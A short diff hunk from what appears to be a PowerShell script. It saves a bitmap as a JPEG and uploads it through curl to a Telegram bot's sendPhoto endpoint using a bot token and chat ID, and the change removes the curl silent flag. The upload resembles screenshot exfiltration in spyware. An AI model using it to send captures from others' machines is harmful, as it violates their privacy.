@@ -16,9 +16,7 @@ $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
 $g.Dispose()
 $bmp.Dispose()
 
-$curl = "$env:SystemRoot\System32\curl.exe"
-
-& $curl -s `
+& "$env:SystemRoot\System32\curl.exe" `
   -F "chat_id=$ChatId" `
   -F "photo=@$path" `
   "https://api.telegram.org/bot$BotToken/sendPhoto"
